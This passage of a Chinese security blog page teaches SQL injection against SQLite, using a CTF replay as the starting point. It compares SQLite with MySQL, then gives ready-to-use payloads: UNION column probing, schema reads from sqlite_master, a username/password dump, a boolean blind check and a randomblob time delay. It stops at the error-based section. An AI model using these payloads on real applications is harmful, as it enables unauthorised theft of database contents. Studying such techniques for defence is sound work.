@@ -1,0 +1,146 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+  SQLite下的SQL注入
+  #
+
+在极客大挑战复现的时候遇到了 SQLite 数据库的 SQL 注入，所以现在在此记录一下，也是扩展一下关于数据库的知识。
+
+  SQLite 基础
+  #
+
+SQLite 和 MySQL 的区别还是比较大的，由于架构设计、语法和内置函数的不同，所以 MySQL 的注入技巧在 SQLite 上大部分会失效。
+下面是 MySQL 和 SQLite 的一些区别：
+
+	
+			
+					差异
+					MySQL
+					SQLite
+					注意点
+			
+	
+	
+			
+					数据库架构
+					客户端-服务器模式，有独立的服务进程
+					嵌入式数据据库，整个数据库是一个独立文件
+					攻击 SQLite时，可能通过文件读取漏洞直接获取.db文件，而在 MySQL 中几乎不可能
+			
+			
+					元数据表
+					通过information_schema数据库查询所有表、列信息
+					使用sqlite_master表存储所有表结构信息
+					所有基于information_schema的语句都会失效
+			
+			
+					多语句执行
+					PHP等连接器默认不支持堆叠注入
+					支持使用;执行多条SQL语句
+					SQLite的注入理论上危害更大，可以直接执行INSERT/UPDATE/DELETE等语句
+			
+			
+					盲注函数
+					常用sleep()或benchmark()制造时间延迟来判断条件
+					无sleep()函数，需要找替代方案
+					所有基于sleep()的延时注入脚本和工具都无法直接使用
+			
+			
+					用户与权限
+					有完整的用户和权限系统，可高权限跨库操作或读写文件
+					无用户概念，其权限完全基于操作系统对文件的读写权限
+					无法使用load_file、into outfile()这类需要MySQL特定权限的函数
+			
+			
+					文件操作
+					拥有FILE权限时可使用load_file()和into outfile()读写文件
+					没有内置的文件读写函数，可通过附加数据库等方式间接操作
+					直接的读写文件操作无法执行
+			
+	
+
+
+  SQLite简介
+  #
+
+SQLite 是一个轻量级、无服务器、直接读写文件的数据库。它的架构是嵌入式，不是独立进程，而是一个链接到程序中的库，数据库就是一个文件，这点可以理解为C语言中 include 文件，一个程序includeSQLite，就把 SQLite 中所有的函数声明都引入进来了。
+由于 SQLite 是一个独立文件，所以 SQLite 没有用户验证，读写操作完全依赖于操作系统的权限。"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/"><meta property="og:site_name" content="S0lowalker"><meta property="og:title" content="SQLite下的SQL注入"><meta property="og:description" content="SQLite下的SQL注入 # 在极客大挑战复现的时候遇到了 SQLite 数据库的 SQL 注入，所以现在在此记录一下，也是扩展一下关于数据库的知识。
+SQLite 基础 # SQLite 和 MySQL 的区别还是比较大的，由于架构设计、语法和内置函数的不同，所以 MySQL 的注入技巧在 SQLite 上大部分会失效。
+下面是 MySQL 和 SQLite 的一些区别：
+差异 MySQL SQLite 注意点 数据库架构 客户端-服务器模式，有独立的服务进程 嵌入式数据据库，整个数据库是一个独立文件 攻击 SQLite时，可能通过文件读取漏洞直接获取.db文件，而在 MySQL 中几乎不可能 元数据表 通过information_schema数据库查询所有表、列信息 使用sqlite_master表存储所有表结构信息 所有基于information_schema的语句都会失效 多语句执行 PHP等连接器默认不支持堆叠注入 支持使用;执行多条SQL语句 SQLite的注入理论上危害更大，可以直接执行INSERT/UPDATE/DELETE等语句 盲注函数 常用sleep()或benchmark()制造时间延迟来判断条件 无sleep()函数，需要找替代方案 所有基于sleep()的延时注入脚本和工具都无法直接使用 用户与权限 有完整的用户和权限系统，可高权限跨库操作或读写文件 无用户概念，其权限完全基于操作系统对文件的读写权限 无法使用load_file、into outfile()这类需要MySQL特定权限的函数 文件操作 拥有FILE权限时可使用load_file()和into outfile()读写文件 没有内置的文件读写函数，可通过附加数据库等方式间接操作 直接的读写文件操作无法执行 SQLite简介 # SQLite 是一个轻量级、无服务器、直接读写文件的数据库。它的架构是嵌入式，不是独立进程，而是一个链接到程序中的库，数据库就是一个文件，这点可以理解为C语言中 include 文件，一个程序includeSQLite，就把 SQLite 中所有的函数声明都引入进来了。
+由于 SQLite 是一个独立文件，所以 SQLite 没有用户验证，读写操作完全依赖于操作系统的权限。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-23T00:00:00+00:00"><meta property="article:tag" content="数据库"><title>SQLite下的SQL注入 | S0lowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/><link rel=stylesheet href=/book.min.31c453d41ba8febf45a3c125de02ecdbd5a000186bc220da3d8ade8f54ed6ec1.css integrity="sha256-McRT1Buo/r9Fo8El3gLs29WgABhrwiDaPYrej1TtbsE=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f3b8735e92aacb11c612456ae889aa7fadc9da7bad1b75639d6dd000d07b5fc7.js integrity="sha256-87hzXpKqyxHGEkVq6Imqf63J2nutG3VjnW3QANB7X8c=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><a href=https://s0lowalker.github.io/ class=top-header-title>S0lowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>S0lowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li><li><input type=checkbox id=section-c47aa3d5834730def37f0c0296806937 class=toggle>
+<label for=section-c47aa3d5834730def37f0c0296806937 class="flex justify-between"><a role=button>Java反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle checked>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle checked>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/ class=active>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>SQLite下的SQL注入</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#sqlite-基础>SQLite 基础</a><ul><li><a href=#sqlite简介>SQLite简介</a></li><li><a href=#sqlite-基本语法与操作>SQLite 基本语法与操作</a></li><li><a href=#特殊的数据库sqlite_master>特殊的数据库：sqlite_master</a></li><li><a href=#常用内置函数>常用内置函数</a></li></ul></li><li><a href=#sqlite-场景下的注入攻击方法>SQLite 场景下的注入攻击方法</a><ul><li><a href=#联合查询注入>联合查询注入</a></li><li><a href=#盲注>盲注</a></li><li><a href=#报错注入>报错注入</a></li><li><a href=#堆叠注入>堆叠注入</a></li><li><a href=#sqlite-特殊技巧>SQLite 特殊技巧</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=sqlite下的sql注入>SQLite下的SQL注入
+<a class=anchor href=#sqlite%e4%b8%8b%e7%9a%84sql%e6%b3%a8%e5%85%a5>#</a></h1><p>在极客大挑战复现的时候遇到了 SQLite 数据库的 SQL 注入，所以现在在此记录一下，也是扩展一下关于数据库的知识。</p><h2 id=sqlite-基础>SQLite 基础
+<a class=anchor href=#sqlite-%e5%9f%ba%e7%a1%80>#</a></h2><p>SQLite 和 MySQL 的区别还是比较大的，由于架构设计、语法和内置函数的不同，所以 MySQL 的注入技巧在 SQLite 上大部分会失效。</p><p>下面是 MySQL 和 SQLite 的一些区别：</p><table><thead><tr><th>差异</th><th>MySQL</th><th>SQLite</th><th>注意点</th></tr></thead><tbody><tr><td>数据库架构</td><td>客户端-服务器模式，有独立的服务进程</td><td>嵌入式数据据库，整个数据库是一个独立文件</td><td>攻击 SQLite时，可能通过文件读取漏洞直接获取<code>.db</code>文件，而在 MySQL 中几乎不可能</td></tr><tr><td>元数据表</td><td>通过<code>information_schema</code>数据库查询所有表、列信息</td><td>使用<code>sqlite_master</code>表存储所有表结构信息</td><td>所有基于<code>information_schema</code>的语句都会失效</td></tr><tr><td>多语句执行</td><td>PHP等连接器默认不支持堆叠注入</td><td>支持使用<code>;</code>执行多条SQL语句</td><td>SQLite的注入理论上危害更大，可以直接执行<code>INSERT/UPDATE/DELETE</code>等语句</td></tr><tr><td>盲注函数</td><td>常用<code>sleep()</code>或<code>benchmark()</code>制造时间延迟来判断条件</td><td>无<code>sleep()</code>函数，需要找替代方案</td><td>所有基于<code>sleep()</code>的延时注入脚本和工具都无法直接使用</td></tr><tr><td>用户与权限</td><td>有完整的用户和权限系统，可高权限跨库操作或读写文件</td><td>无用户概念，其权限完全基于操作系统对文件的读写权限</td><td>无法使用<code>load_file</code>、<code>into outfile()</code>这类需要MySQL特定权限的函数</td></tr><tr><td>文件操作</td><td>拥有<code>FILE</code>权限时可使用<code>load_file()</code>和<code>into outfile()</code>读写文件</td><td>没有内置的文件读写函数，可通过附加数据库等方式间接操作</td><td>直接的读写文件操作无法执行</td></tr></tbody></table><h3 id=sqlite简介>SQLite简介
+<a class=anchor href=#sqlite%e7%ae%80%e4%bb%8b>#</a></h3><p>SQLite 是一个轻量级、无服务器、直接读写文件的数据库。它的架构是嵌入式，不是独立进程，而是一个链接到程序中的库，数据库就是一个文件，这点可以理解为C语言中 include 文件，一个程序<code>include</code>SQLite，就把 SQLite 中所有的函数声明都引入进来了。</p><p>由于 SQLite 是一个独立文件，所以 SQLite 没有用户验证，读写操作完全依赖于操作系统的权限。</p><p>SQLite 的列有推荐类型，但是也能在同一列中存不同类型，可以存数字，文本甚至是二进制数据，而 MySQL 的类型很严格。</p><p>SQLite 原生支持堆叠注入，注释一般支持<code>-- </code>和<code>/**/</code>。</p><h3 id=sqlite-基本语法与操作>SQLite 基本语法与操作
+<a class=anchor href=#sqlite-%e5%9f%ba%e6%9c%ac%e8%af%ad%e6%b3%95%e4%b8%8e%e6%93%8d%e4%bd%9c>#</a></h3><h4 id=创建与打开数据库就是操作一个文件>创建与打开数据库：就是操作一个文件
+<a class=anchor href=#%e5%88%9b%e5%bb%ba%e4%b8%8e%e6%89%93%e5%bc%80%e6%95%b0%e6%8d%ae%e5%ba%93%e5%b0%b1%e6%98%af%e6%93%8d%e4%bd%9c%e4%b8%80%e4%b8%aa%e6%96%87%e4%bb%b6>#</a></h4><p>在 MySQL 中，我们要先连接服务器，然后<code>create database mydb;</code>，而在 SQLite 中，我们直接指定一个路径，若文件存在则打开，不存在则新建：<code>sqlite3 /.../mydb.db</code>。后续的操作都在这个文件里。</p><h4 id=数据类型>数据类型
+<a class=anchor href=#%e6%95%b0%e6%8d%ae%e7%b1%bb%e5%9e%8b>#</a></h4><p>SQLite 有5种数据类型，但核心理念是<strong>动态类型</strong>，也就是说，我们可以把字符串放到设计为数字的列中。</p><table><thead><tr><th>存储类</th><th>说明</th></tr></thead><tbody><tr><td><code>NULL</code></td><td>空值</td></tr><tr><td><code>INTERGER</code></td><td>有符号整数</td></tr><tr><td><code>REAL</code></td><td>浮点数</td></tr><tr><td><code>TEXT</code></td><td>文本字符串，用单引号包裹</td></tr><tr><td><code>BLOB</code></td><td>二进制数据，原样存</td></tr></tbody></table><p><strong>和 MySQL 的关键不同</strong>：</p><ul><li><strong>无 <code>BOOLEAN</code></strong>：用整数 <code>0</code> (假) 和 <code>1</code> (真) 表示。</li><li><strong>无 <code>DATETIME</code></strong>：通常用 <code>TEXT</code> 或 <code>INTEGER</code> 存日期。</li><li><strong><code>AUTOINCREMENT</code> 不同</strong>：建表时写 <code>INTEGER PRIMARY KEY</code>，它就会自动成为自增主键，且复用 <code>rowid</code>。不需要特意声明。</li></ul><h4 id=基本操作>基本操作
+<a class=anchor href=#%e5%9f%ba%e6%9c%ac%e6%93%8d%e4%bd%9c>#</a></h4><p>和 MySQL 的差别不是很大，主要是语法细节和函数名。</p><h5 id=插入insert>插入(INSERT)
+<a class=anchor href=#%e6%8f%92%e5%85%a5insert>#</a></h5><pre tabindex=0><code class=language-sqlite data-lang=sqlite>INSERT INTO users (username, age, balance) VALUES (&#39;张三&#39;, 25, 99.95);
+</code></pre><h5 id=查询select>查询(SELECT)
+<a class=anchor href=#%e6%9f%a5%e8%af%a2select>#</a></h5><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 拿前10条
+SELECT * FROM users LIMIT 10;
+
+-- 跳过5条拿10条
+SELECT * FROM users LIMIT 10 OFFSET 5;
+</code></pre><p>**注：**如果要拼接字符串，SQLite 使用<code>||</code>，不是 MySQL 的<code>concat()</code>。</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>SELECT &#39;用户名是：&#39; || username FROM users;
+</code></pre><h5 id=更新update>更新(UPDATE)
+<a class=anchor href=#%e6%9b%b4%e6%96%b0update>#</a></h5><pre tabindex=0><code class=language-sqlite data-lang=sqlite>UPDATE users SET balance = 0.00 WHERE id = 1;
+</code></pre><h5 id=删除delete>删除(DELETE)
+<a class=anchor href=#%e5%88%a0%e9%99%a4delete>#</a></h5><pre tabindex=0><code class=language-sqlite data-lang=sqlite>DELETE FROM users WHERE id = 1;
+</code></pre><h3 id=特殊的数据库sqlite_master>特殊的数据库：sqlite_master
+<a class=anchor href=#%e7%89%b9%e6%ae%8a%e7%9a%84%e6%95%b0%e6%8d%ae%e5%ba%93sqlite_master>#</a></h3><p>SQLite 的元数据都存在<code>sqlite_master</code>这张表中，不像 MySQL 一样用的<code>information_schema</code>。想了解数据库中有什么，就查<code>sqlite_master</code>。</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 查看所有用户建的表
+SELECT name FROM sqlite_master WHERE type=&#39;table&#39;;
+
+-- 查看创建 users 表时的完整 SQL 语句
+SELECT sql FROM sqlite_master WHERE name=&#39;users&#39;;
+</code></pre><p>SQLite 的<code>sqlite_master</code>表中有几个固定的字段：</p><table><thead><tr><th style=text-align:left>字段名</th><th style=text-align:left>说明</th></tr></thead><tbody><tr><td style=text-align:left><code>type</code></td><td style=text-align:left>对象类型。只有这几种：<code>table</code>（表）、<code>index</code>（索引）、<code>view</code>（视图）、<code>trigger</code>（触发器）。</td></tr><tr><td style=text-align:left><code>name</code></td><td style=text-align:left>你给这个对象起的名字，比如表名 <code>users</code>、索引名 <code>idx_username</code>。</td></tr><tr><td style=text-align:left><code>tbl_name</code></td><td style=text-align:left>对于索引，它显示这个索引属于哪张表。对于表或视图，它就等于 <code>name</code>。</td></tr><tr><td style=text-align:left><code>rootpage</code></td><td style=text-align:left>对象数据在数据库文件里的起始页号，日常查询基本不用。</td></tr><tr><td style=text-align:left><code>sql</code></td><td style=text-align:left>创建这个对象时用的原始 SQL 语句。对于表，这里就是 <code>CREATE TABLE users (...)</code>。</td></tr></tbody></table><h3 id=常用内置函数>常用内置函数
+<a class=anchor href=#%e5%b8%b8%e7%94%a8%e5%86%85%e7%bd%ae%e5%87%bd%e6%95%b0>#</a></h3><p>这些是日常查询和 SQL 注入时都会碰到的基本函数。</p><table><thead><tr><th style=text-align:left>功能</th><th style=text-align:left>函数举例</th><th style=text-align:left>说明</th></tr></thead><tbody><tr><td style=text-align:left>文本操作</td><td style=text-align:left><code>substr(str, start, length)</code></td><td style=text-align:left>截取子串。<strong>索引从 1 开始</strong>，不是0。</td></tr><tr><td style=text-align:left></td><td style=text-align:left><code>length(str)</code></td><td style=text-align:left>字符串长度。</td></tr><tr><td style=text-align:left></td><td style=text-align:left><code>hex(str)</code>, <code>unhex(hex_str)</code></td><td style=text-align:left>转十六进制，盲注时常用。</td></tr><tr><td style=text-align:left>聚合</td><td style=text-align:left><code>count()</code>, <code>sum()</code>, <code>avg()</code></td><td style=text-align:left>和标准 SQL 一样。</td></tr><tr><td style=text-align:left></td><td style=text-align:left><code>group_concat(column, ',')</code></td><td style=text-align:left><strong>极常用</strong>。把多行结果拼成一个字符串。</td></tr><tr><td style=text-align:left>其他</td><td style=text-align:left><code>randomblob(N)</code></td><td style=text-align:left>生成 N 字节的随机数据，盲注延时关键。</td></tr><tr><td style=text-align:left></td><td style=text-align:left><code>sqlite_version()</code></td><td style=text-align:left>返回版本号，探测数据库时用。</td></tr><tr><td style=text-align:left></td><td style=text-align:left><code>typeof(表达式)</code></td><td style=text-align:left>返回数据类型（integer/text）。</td></tr></tbody></table><h2 id=sqlite-场景下的注入攻击方法>SQLite 场景下的注入攻击方法
+<a class=anchor href=#sqlite-%e5%9c%ba%e6%99%af%e4%b8%8b%e7%9a%84%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb%e6%96%b9%e6%b3%95>#</a></h2><p>SQLite 的注入场景可按攻击目的和手法来分类，主要是这四种：联合查询、盲注、报错、堆叠，和 MySQL 场景下的 SQL 注入还是比较像的。</p><h3 id=联合查询注入>联合查询注入
+<a class=anchor href=#%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5>#</a></h3><p>这是最直接、最有效的方法，步骤和 MySQL 几乎一样，只是查询元数据的语句有所不同。由于 SQLite 只有一个数据库，所以可以少一个查询数据库的步骤。</p><h4 id=第一步确定列数>第一步：确定列数
+<a class=anchor href=#%e7%ac%ac%e4%b8%80%e6%ad%a5%e7%a1%ae%e5%ae%9a%e5%88%97%e6%95%b0>#</a></h4><pre tabindex=0><code class=language-sqlite data-lang=sqlite>&#39; ORDER BY 3--     -- 不断改数字，直到报错，就知道列数了
+&#39; UNION SELECT 1,2,3--  -- 也可以直接用 UNION 测
+</code></pre><h4 id=第二步看哪些列有回显>第二步：看哪些列有回显
+<a class=anchor href=#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e7%9c%8b%e5%93%aa%e4%ba%9b%e5%88%97%e6%9c%89%e5%9b%9e%e6%98%be>#</a></h4><p>假设测出3列，在页面上看到数字 <code>2</code> 和 <code>3</code> 回显了，那第1列就不可见。</p><h4 id=第三步查数据库结构>第三步：查数据库结构
+<a class=anchor href=#%e7%ac%ac%e4%b8%89%e6%ad%a5%e6%9f%a5%e6%95%b0%e6%8d%ae%e5%ba%93%e7%bb%93%e6%9e%84>#</a></h4><p>这是和 MySQL 最大的区别——换成查 <code>sqlite_master</code>：</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 查所有表名
+&#39; UNION SELECT 1, name, 3 FROM sqlite_master WHERE type=&#39;table&#39;--
+
+-- 查某张表的建表 SQL（包含所有列名）
+&#39; UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name=&#39;users&#39;--
+</code></pre><h4 id=第四步窃取数据>第四步：窃取数据
+<a class=anchor href=#%e7%ac%ac%e5%9b%9b%e6%ad%a5%e7%aa%83%e5%8f%96%e6%95%b0%e6%8d%ae>#</a></h4><p>知道表叫 <code>users</code>，列有 <code>username</code> 和 <code>password</code>，直接掏空：</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>&#39; UNION SELECT 1, username || &#39;:&#39; || password, 3 FROM users--
+</code></pre><p><code>||</code> 是 SQLite 拼字符串的符号，可以把两个字段拼在一起，从一个回显位同时拿出来。</p><h3 id=盲注>盲注
+<a class=anchor href=#%e7%9b%b2%e6%b3%a8>#</a></h3><h4 id=布尔盲注>布尔盲注
+<a class=anchor href=#%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8>#</a></h4><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 猜 password 的第一个字符是不是 &#39;a&#39;（十六进制 61）
+&#39; AND (SELECT hex(substr(password,1,1)) FROM users LIMIT 1)=&#39;61&#39;--
+</code></pre><p>SQLite 的 <code>substr()</code> 索引<strong>从 1 开始</strong>，不是 0。</p><h4 id=时间盲注>时间盲注
+<a class=anchor href=#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8>#</a></h4><p>SQLite 没有<code>sleep()</code>函数，需要自己创造延时。使用<code>randomblob()</code>让数据库做大量计算。</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 如果条件成立，就生成一个 2 亿字节的随机 blob，造成明显延时
+&#39; AND (CASE WHEN (条件) THEN randomblob(200000000) ELSE 0 END)--
+</code></pre><h3 id=报错注入>报错注入
+<a class=anchor href=#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5>#</a></h3><h4 id=利用不存在的函数>利用不存在的函数
